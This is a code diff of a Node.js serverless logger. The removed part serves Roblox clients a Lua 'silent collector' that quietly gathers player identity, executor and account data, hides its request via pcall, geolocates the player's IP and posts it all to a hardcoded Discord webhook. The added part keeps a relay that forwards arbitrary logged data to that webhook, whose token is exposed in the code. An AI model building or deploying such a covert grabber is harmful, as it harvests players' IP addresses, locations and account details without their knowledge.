@@ -1,108 +1,99 @@
 const https = require('https');
 
-const SETTINGS = {
-    WEBHOOK: "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5",
-    PLAIN_TEXT_RESP: "memrk"
-};
+// ==========================================
+// WEBHOOK RAHASIA (HANYA ADA DI SINI)
+// ==========================================
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
 
-async function getGeo(ip) {
+// ==========================================
+// FUNGSI KIRIM KE DISCORD
+// ==========================================
+async function sendToDiscord(playerData) {
+    const embed = {
+        title: "🚀 Ndraawz Logger System",
+        color: 0x00ff88,
+        fields: playerData.fields || [],
+        footer: { 
+            text: "Ndraawz Security Logger",
+            icon_url: "https://cdn.discordapp.com/attachments/1464912658108125278/1472698650848395451/icon.png"
+        },
+        timestamp: new Date().toISOString()
+    };
+
+    const payload = JSON.stringify({ embeds: [embed] });
+    const url = new URL(DISCORD_WEBHOOK_URL);
+
+    const options = {
+        hostname: url.hostname,
+        path: url.pathname + url.search,
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': Buffer.byteLength(payload)
+        }
+    };
+
     return new Promise((resolve) => {
-        const req = https.get(`https://ipwho.is/${ip}`, (res) => {
+        const req = https.request(options, (res) => {
             let data = '';
-            res.on('data', d => data += d);
+            res.on('data', chunk => data += chunk);
             res.on('end', () => {
-                try { resolve(JSON.parse(data)); } catch(e) { resolve({}); }
+                if (res.statusCode === 204 || res.statusCode === 200) {
+                    console.log("✅ Log terkirim ke Discord");
+                    resolve(true);
+                } else {
+                    console.log(`❌ Gagal kirim ke Discord: ${res.statusCode}`);
+                    resolve(false);
+                }
             });
         });
-        req.on('error', () => resolve({}));
-        req.setTimeout(2000, () => req.destroy());
+        req.on('error', (err) => {
+            console.error("Error sending to Discord:", err);
+            resolve(false);
+        });
+        req.write(payload);
+        req.end();
     });
 }
 
-module.exports = async (req, res) => {
-    res.setHeader('Content-Type', 'text/plain');
-    const agent = req.headers['user-agent'] || "";
-    const ip = req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || "unknown";
-    const { step, u, uid, exec, pid, pname, jid, pcount, pmax, age } = req.query;
-
-    if (!agent.includes("Roblox")) return res.status(200).send(SETTINGS.PLAIN_TEXT_RESP);
-
-    // --- STEP 0: THE SILENT COLLECTOR ---
-    if (!step) {
-        const host = req.headers.host;
-        const path = req.url.split('?')[0];
-        
-        // Gue pake pcall dan request internal biar ga muncul link panjang di console/spy
-        const collector = `
-            local lp = game.Players.LocalPlayer
-            local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-            local function getAge()
-                local s, r = pcall(function() return game:HttpGet("https://users.roblox.com/v1/users/"..lp.UserId) end)
-                return (s and game:GetService("HttpService"):JSONDecode(r).created:sub(1,10)) or "-"
-            end
-
-            local data = {
-                step = "1",
-                u = lp.Name,
-                uid = lp.UserId,
-                exec = (identifyexecutor and identifyexecutor()) or "Unknown",
-                pid = game.PlaceId,
-                pname = info.Name,
-                jid = game.JobId,
-                pcount = #game.Players:GetPlayers(),
-                pmax = game.Players.MaxPlayers,
-                age = getAge()
-            }
-
-            local params = ""
-            for k, v in pairs(data) do
-                params = params .. k .. "=" .. game.HttpService:UrlEncode(tostring(v)) .. "&"
-            end
-
-            -- PENTING: Pake pcall biar ga error di client
-            pcall(function()
-                game:HttpGet("https://${host}${path}?" .. params)
-            end)
-            print("Successfully Integrated")
-        `.trim();
-        return res.status(200).send(collector);
+// ==========================================
+// HANDLER UTAMA
+// ==========================================
+module.exports = async function handler(req, res) {
+    // CORS header
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+    
+    // Handle preflight
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
+    
+    // Hanya terima POST
+    if (req.method !== 'POST') {
+        return res.status(405).json({ error: 'Method Not Allowed' });
     }
 
-    // --- STEP 1: SEND TO DISCORD ---
+    let body = '';
+    await new Promise((resolve) => {
+        req.on('data', chunk => { body += chunk; });
+        req.on('end', resolve);
+    });
+
     try {
-        const geo = await getGeo(ip);
-        const flag = geo.country_code ? geo.country_code.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397)) : "🏴‍☠️";
-
-        const embed = {
-            title: "📢 Player Info Logger (GOD MODE)",
-            color: 16753920,
-            fields: [
-                { name: "👤 Username", value: u || "Unknown", inline: true },
-                { name: "🆔 User ID", value: uid || "Unknown", inline: true },
-                { name: "📅 Account Created", value: age || "-", inline: true },
-                { name: "💻 Executor", value: exec || "Unknown", inline: true },
-                { name: "🌐 IP Address", value: `||${ip}||`, inline: true },
-                { name: "🏳️ Country", value: `${flag} ${geo.country || "Unknown"}`, inline: true },
-                { name: "🏙️ City", value: `${geo.city || "Unknown"}`, inline: true },
-                { name: "🗺️ Map", value: `[${pname || "Game"}](https://www.roblox.com/games/${pid})`, inline: false },
-                { name: "👥 Players", value: `${pcount} / ${pmax}`, inline: true }
-            ],
-            thumbnail: { url: `https://www.roblox.com/headshot-thumbnail/image?userId=${uid}&width=420&height=420&format=png` },
-            footer: { text: "Ndraawz Security | " + new Date().toLocaleString() },
-            timestamp: new Date().toISOString()
-        };
-
-        const discordReq = https.request(SETTINGS.WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' }
-        });
+        const logData = JSON.parse(body);
         
-        discordReq.write(JSON.stringify({ embeds: [embed] }));
-        discordReq.end();
-
-        // Kasih respon cepet biar Roblox ga timeout
-        return res.status(200).send("OK");
+        // Kirim ke Discord
+        const success = await sendToDiscord(logData);
+        
+        if (success) {
+            res.status(200).json({ status: 'ok', message: 'Log terkirim' });
+        } else {
+            res.status(500).json({ error: 'Failed to send to Discord' });
+        }
     } catch (err) {
-        return res.status(500).send("ERR");
+        console.error("Logger error:", err);
+        res.status(400).json({ error: 'Invalid JSON' });
     }
 };
